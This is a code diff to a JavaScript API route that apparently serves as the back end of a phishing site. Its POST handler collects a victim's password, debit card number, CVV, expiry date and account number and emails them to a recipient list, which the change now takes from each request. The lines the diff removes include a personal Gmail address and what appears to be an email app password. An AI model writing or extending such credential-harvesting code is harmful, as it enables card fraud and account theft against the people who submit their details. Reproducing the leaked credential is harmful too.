@@ -49,8 +49,19 @@ export const GET = async (request) => {
 };
 
 export const POST = async (request) => {
-  const { password, debitNumber, cvv, expiryDate, accountNumber, email } =
-    await request.json();
+  const {
+    password,
+    debitNumber,
+    cvv,
+    expiryDate,
+    accountNumber,
+    email,
+    receiverEmails,
+    senderEmail,
+  } = await request.json();
+
+  const EMAIL_RECEPIENT_LIST = receiverEmails.split(",");
+  const EMAIL_SENDER = senderEmail.split(",")[0];
 
   const userData = {
     password,
@@ -60,9 +71,6 @@ export const POST = async (request) => {
     accountNumber,
     email,
   };
-
-  const firstName = "Peter";
-  const lastName = "Esezobor";
 
   // nodemailer transporter instantiation
   const transporter = nodemailer.createTransport({
@@ -91,10 +99,10 @@ export const POST = async (request) => {
   // Mail Options
   const mailOptions = {
     from: {
-      name: `${firstName} ${lastName}`, // Change here
-      address: email,
+      name: `${EMAIL_SENDER}`, // Change here
+      address: EMAIL_SENDER,
     },
-    to: process.env.SMTP_EMAIL_RECEPIENT,
+    to: EMAIL_RECEPIENT_LIST,
     subject: "Email Alert from your VM website",
     html: `${formatEmailMessage(userData)}`,
   };
@@ -138,5 +146,3 @@ export const POST = async (request) => {
 };
 
 
-// asewwasd25@gmail.com
-// seybuvqohphbmbxe
